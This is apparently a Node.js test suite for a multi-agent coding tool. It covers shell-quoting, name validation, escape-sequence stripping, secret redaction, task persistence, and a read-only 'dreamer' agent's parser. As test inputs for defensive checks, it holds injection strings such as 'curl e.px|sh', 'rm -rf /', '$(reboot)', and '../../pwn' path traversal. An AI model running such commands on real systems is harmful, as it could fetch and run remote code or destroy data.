import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { randomUUID } from "node:crypto";
import { mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

// tests/resolve-ts-hook.mjs (registered via the npm test script) maps the
// extension modules' .js specifiers to their .ts sources, so every extension
// is importable under --experimental-strip-types.
const { normalizeHandle, shellQuote, AGENT_NAME_RE, sanitizeRender, redactSecrets } = await import(
	"../extensions/registry.ts"
);

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

test("normalizeHandle reduces hostile input to the [a-zA-Z0-9-] allowlist (S1)", () => {
	assert.equal(normalizeHandle("#(curl e.px|sh)"), "curl-epxsh");
	assert.equal(normalizeHandle("#{pane_title}"), "panetitle");
	assert.equal(normalizeHandle("@scout"), "scout");
	assert.equal(normalizeHandle("  My Scout 2 "), "My-Scout-2");
	assert.match(normalizeHandle("\u001b]52;c;abc") ?? "", /^[a-zA-Z0-9-]*$/);
	assert.equal(normalizeHandle("a".repeat(30)), "a".repeat(24));
	assert.equal(normalizeHandle(null), null);
	assert.equal(normalizeHandle("   "), null);
});

test("shellQuote round-trips hostile strings through a real shell (S2)", () => {
	const hostile = [
		"/a b/x.log",
		"safe'; rm -rf /;'",
		"$(reboot)",
		"`id`",
		'x";y\\',
		"#(curl e.px|sh)",
		"",
	];
	for (const value of hostile) {
		const out = spawnSync("sh", ["-c", `printf %s ${shellQuote(value)}`], { encoding: "utf8" });
		assert.equal(out.status, 0, `sh rejected quoting of ${JSON.stringify(value)}`);
		assert.equal(out.stdout, value, `round-trip failed for ${JSON.stringify(value)}`);
	}
});

test("AGENT_NAME_RE rejects shell/tmux metacharacter names", () => {
	assert.equal(AGENT_NAME_RE.test("build"), true);
	assert.equal(AGENT_NAME_RE.test("build; curl evil|sh"), false);
	assert.equal(AGENT_NAME_RE.test("../../pwn"), false);
	assert.equal(AGENT_NAME_RE.test("Build"), false);
	assert.equal(AGENT_NAME_RE.test("a b"), false);
});

test("every agents/*.md name survives the gate", () => {
	const dir = path.join(REPO_ROOT, "agents");
	const names = readdirSync(dir)
		.filter((f) => f.endsWith(".md"))
		.map((f) => {
			const raw = readFileSync(path.join(dir, f), "utf8");
			return /^name:\s*(.+)$/m.exec(raw)?.[1]?.trim() ?? path.basename(f, ".md");
		});
	assert.ok(names.length > 0, "no agent files found");
	for (const name of names) assert.match(name, AGENT_NAME_RE, `agent name rejected: ${name}`);
	assert.deepEqual([...names].sort(), [
		"builder",
		"dreamer",
		"explorer",
		"leader",
		"librarian",
		"looker",
		"reviewer",
	]);
});

// ---- delegation control plane + RPC lifecycle ----
const { steerDelegation, stopDelegation } = await import("../extensions/registry.ts");

test("delegation-controls map is hoisted to globalThis (cross-entry sharing)", () => {
	const slot = globalThis[Symbol.for("torus.delegation-controls")];
	assert.ok(slot instanceof Map, "torus.delegation-controls slot missing on globalThis");
});

test("stop/steer on unknown or finished delegations return false", () => {
	assert.equal(stopDelegation("no-such-id"), false);
	assert.equal(steerDelegation("no-such-id", "hi"), false);
});

test("RpcChild resolves sends on response, rejects pending when child dies early", async () => {
	const { RpcChild } = await import("../extensions/rpc.ts");
	// A: fake engine answers torus-1, then idles — send must resolve
	const alive = new RpcChild(
		process.execPath,
		[
			"-e",
			"console.log(JSON.stringify({type:'response',id:'torus-1',ok:1})); setInterval(()=>{},1000);",
		],
		process.cwd(),
		{},
	);
	const response = await alive.getState();
	assert.equal(response["ok"], 1);
	alive.kill();
	assert.equal(typeof (await alive.exited), "number");

	// B: engine exits while a send is pending and never responds — close hook must reject it
	// (write-after-destroy on Node 26 returns false silently, never erroring — probed 2026-09-30)
	const dead = new RpcChild(
		process.execPath,
		["-e", "setTimeout(() => process.exit(3), 150)"],
		process.cwd(),
		{},
	);
	await assert.rejects(() => dead.getState(), /rpc child closed/);
});

// ---- team tasklist + team spec persistence ----
const teamRuntime = await import("../extensions/team-runtime.ts");

test("team tasklist migrates legacy array schema and issues monotonic ids", () => {
	const teamId = `test-${randomUUID().slice(0, 8)}`;
	try {
		// legacy shape: bare array under "tasks", no nextId (pre-migration file)
		mkdirSync(teamRuntime.teamDir(teamId), { recursive: true });
		writeFileSync(
			teamRuntime.tasksFile(teamId),
			JSON.stringify(
				{
					tasks: [
						{ id: "t1", subject: "a", assignee: null, status: "pending", updatedAt: "x" },
						{ id: "t3", subject: "c", assignee: null, status: "completed", updatedAt: "x" },
					],
				},
				null,
				2,
			),
			"utf8",
		);
		const migrated = teamRuntime.readTasksFile(teamId);
		assert.equal(migrated.nextId, 4, "legacy ids must migrate to max+1, not length+1");
		// create via the tool's flow: id from nextId, write back with nextId+1
		const task = {
			id: `t${migrated.nextId}`,
			subject: "new",
			assignee: null,
			status: "pending",
			updatedAt: "y",
		};
		teamRuntime.writeTasksFile(teamId, {
			nextId: migrated.nextId + 1,
			tasks: [...migrated.tasks, task],
		});
		const after = teamRuntime.readTasksFile(teamId);
		assert.equal(after.tasks.length, 3);
		assert.ok(
			after.tasks.some((t) => t.id === "t4"),
			"new id must be t4 (no collision with surviving t3)",
		);
		assert.equal(after.nextId, 5);
	} finally {
		rmSync(teamRuntime.teamDir(teamId), { recursive: true, force: true });
	}
});

test("team spec persists shutdown status for post-restart hydration", () => {
	const teamId = `test-${randomUUID().slice(0, 8)}`;
	try {
		teamRuntime.writeTeamSpec(teamId, {
			name: "t",
			objective: "o",
			members: [{ name: "m1", agent: "builder" }],
		});
		assert.equal(teamRuntime.readTeamSpec(teamId)?.status, undefined, "fresh spec has no status");
		teamRuntime.markTeamStatus(teamId, "shutdown");
		assert.equal(
			teamRuntime.readTeamSpec(teamId)?.status,
			"shutdown",
			"shutdown must survive on disk",
		);
	} finally {
		rmSync(teamRuntime.teamDir(teamId), { recursive: true, force: true });
	}
});

// ---- untrusted-input sanitization + secret redaction ----
test("sanitizeRender strips OSC/CSI escapes and C1 controls from rendered strings", () => {
	assert.equal(sanitizeRender("\u001b]52;c;aGk=\u001b\\plain"), "plain");
	assert.equal(sanitizeRender("\u001b[31mred\u001b[0m"), "red");
	assert.equal(sanitizeRender("before\u0085after"), "beforeafter");
	assert.equal(sanitizeRender("clean text"), "clean text");
});

test("redactSecrets removes credential shapes but keeps benign prose", () => {
	const auth = redactSecrets('curl -H "Authorization: Bearer sk-abcdefgh1234" https://api');
	assert.equal(auth.includes("sk-abcdefgh1234"), false);
	assert.equal(auth.includes("Authorization: Bearer [redacted]"), true);
	assert.equal(redactSecrets("token is sk-abcdefgh1234 ok"), "token is [redacted] ok");
	assert.equal(
		redactSecrets("GITHUB_TOKEN=ghp_secret123 deploy"),
		"GITHUB_TOKEN=[redacted] deploy",
	);
	assert.equal(redactSecrets("ran with LUCKY=notsecret today"), "ran with LUCKY=notsecret today");
});

// ---- shared modules: fsutil, engine-child, fleet theme-kit ----
test("fsutil readJson/writeJson round-trip and splitList semantics", async () => {
	const { readJson, writeJson, splitList } = await import("../extensions/fsutil.ts");
	const { mkdtempSync } = await import("node:fs");
	const { tmpdir } = await import("node:os");
	const dir = mkdtempSync(path.join(tmpdir(), "torus-fsutil-"));
	try {
		const file = path.join(dir, "state.json");
		assert.deepEqual(readJson(file, { x: 1 }), { x: 1 }, "missing file returns fallback");
		writeJson(file, { x: 2 });
		assert.deepEqual(readJson(file, null), { x: 2 });
		assert.throws(() => readFileSync(`${file}.tmp`, "utf8"), "tmp file must be renamed away");
	} finally {
		rmSync(dir, { recursive: true, force: true });
	}
	assert.deepEqual(splitList("a, b ,,c"), ["a", "b", "c"]);
	assert.deepEqual(splitList(undefined), []);
});

test("formatCost renders negative cost as no cost at all", async () => {
	const { formatCost } = await import("../extensions/fsutil.ts");
	assert.equal(formatCost(-0.5, true), "", "negative sub-dollar cost renders nothing");
	assert.equal(formatCost(-5, true), "", "negative dollar-plus cost renders nothing");
});

test("flattenPreview flattens whitespace and truncates with ellipsis", async () => {
	const { flattenPreview } = await import("../extensions/fleet/theme-kit.ts");
	assert.equal(flattenPreview("a\n  b\t\tc", 20), "a b c");
	assert.equal(flattenPreview("x".repeat(80), 60).length, 60);
	assert.ok(flattenPreview("x".repeat(80), 60).endsWith("…"));
	assert.equal(flattenPreview(undefined, 10), "");
	assert.equal(flattenPreview("abc", 2), "a…");
});

test("formatTokens and shortModel format compactly", async () => {
	const { formatTokens, shortModel } = await import("../extensions/fleet/theme-kit.ts");
	assert.equal(formatTokens(12), "12");
	assert.equal(formatTokens(1234), "1.2k");
	assert.equal(formatTokens(2_500_000), "2.5M");
	assert.equal(shortModel("zai/glm-5.3"), "glm-5.3");
	assert.equal(shortModel("bare"), "bare");
});

test("reduceEngineEvent tallies assistant turns, text, and usage only", async () => {
	const { reduceEngineEvent } = await import("../extensions/engine-child.ts");
	const tally = { turns: 0, tokensIn: 0, tokensOut: 0, text: "" };
	reduceEngineEvent(
		{ type: "message_end", message: { role: "user", content: [{ type: "text", text: "ignore" }] } },
		tally,
	);
	assert.equal(tally.turns, 0, "user messages do not count");
	reduceEngineEvent({ type: "tool_call", name: "bash" }, tally);
	assert.equal(tally.turns, 0, "non-message_end events are ignored");
	reduceEngineEvent(
		{
			type: "message_end",
			message: {
				role: "assistant",
				content: [{ type: "text", text: "hello" }],
				usage: { input: 10, output: 20 },
			},
		},
		tally,
	);
	assert.equal(tally.turns, 1);
	assert.equal(tally.text, "hello");
	assert.equal(tally.tokensIn, 10);
	assert.equal(tally.tokensOut, 20);
});

test("resolveEngineBin resolves env first, then repo-local bin", async () => {
	const { resolveEngineBin } = await import("../extensions/engine-child.ts");
	const saved = process.env["TORUS_ENGINE_BIN"];
	try {
		process.env["TORUS_ENGINE_BIN"] = "/custom/pi";
		assert.equal(resolveEngineBin(), "/custom/pi", "env must win");
		delete process.env["TORUS_ENGINE_BIN"];
		assert.ok(
			resolveEngineBin().endsWith("/node_modules/.bin/pi"),
			"repo-local bin must be preferred over PATH",
		);
	} finally {
		if (saved === undefined) delete process.env["TORUS_ENGINE_BIN"];
		else process.env["TORUS_ENGINE_BIN"] = saved;
	}
});

// ---- frontmatter parsing (shared by roster, memory, prompts, team runtime) ----
test("parseFrontmatter extracts fields and body; stripFrontmatter removes the block", async () => {
	const { parseFrontmatter, stripFrontmatter } = await import("../extensions/frontmatter.ts");
	const raw = "---\nname: scout\ndescription: fast scout\n---\nBody text here.";
	const parsed = parseFrontmatter(raw);
	assert.equal(parsed?.fields.get("name"), "scout");
	assert.equal(parsed?.fields.get("description"), "fast scout");
	assert.equal(parsed?.body, "Body text here.");
	assert.equal(stripFrontmatter(raw), "Body text here.");
	assert.equal(parseFrontmatter("no frontmatter"), null);
	assert.equal(stripFrontmatter("no frontmatter"), "no frontmatter");
	// empty values and keys with colons in the value
	const tricky = parseFrontmatter("---\ntopic: a: b is kept\nempty:\n---\nbody");
	assert.equal(tricky?.fields.get("topic"), "a: b is kept");
	assert.equal(tricky?.fields.get("empty"), "");
});

test("session id round-trips through the shared globalThis slot", async () => {
	const { currentSessionId, setCurrentSessionId } = await import("../extensions/registry.ts");
	setCurrentSessionId("smoke-session-1");
	assert.equal(currentSessionId(), "smoke-session-1");
	setCurrentSessionId(null);
	assert.equal(currentSessionId(), null);
});

// ---- dreamer: read-only child returns structured proposals, parent applies ----
test("dreamer agent is in the roster with a read-only toolset", async () => {
	const { AGENTS } = await import("../extensions/roster/index.ts");
	const dreamer = AGENTS.find((a) => a.name === "dreamer");
	assert.ok(dreamer, "dreamer agent must be loaded from agents/");
	assert.deepEqual(
		[...(dreamer.tools ?? [])].sort(),
		["find", "grep", "ls", "read"],
		"no write/bash tools allowed",
	);
});

test("parseDreamOutput extracts structured proposals and rejects hostile shapes", async () => {
	const { parseDreamOutput } = await import("../extensions/memory/index.ts");
	const out = [
		"ENTRY:",
		"---",
		"topic: Lesson A",
		"tags: tests, ci",
		"project: global",
		"---",
		"Run tests before claiming done.",
		"",
		"DELETE: valid-name.md",
		"DELETE: ../../pwn.md",
		"DELETE: entries/x.md",
		"DELETE: second-valid.md, third-valid.md  fourth-valid.md",
		"DELETE: good-in-list.md, ../../pwn2.md",
		"PROFILE: User prefers terse answers",
		"PROFILE: Second fact",
		"PROFILE: Third fact must drop (cap 2)",
		"ENTRY:",
		"---",
		"tags: no-topic",
		"---",
		"entry missing topic and project must be skipped",
	].join("\n");
	const proposal = parseDreamOutput(out);
	assert.equal(proposal.entries.length, 1);
	assert.equal(proposal.entries[0]?.topic, "Lesson A");
	assert.deepEqual(proposal.entries[0]?.tags, ["tests", "ci"]);
	assert.equal(proposal.entries[0]?.body, "Run tests before claiming done.");
	assert.deepEqual(
		proposal.deletes,
		["valid-name.md", "second-valid.md", "third-valid.md", "fourth-valid.md", "good-in-list.md"],
		"path-shaped delete names must be rejected, comma/space lists must split into valid names",
	);
	assert.equal(proposal.profiles.length, 2, "profile lines capped at 2");
	assert.deepEqual(parseDreamOutput("no structure at all"), {
		entries: [],
		deletes: [],
		profiles: [],
	});
});
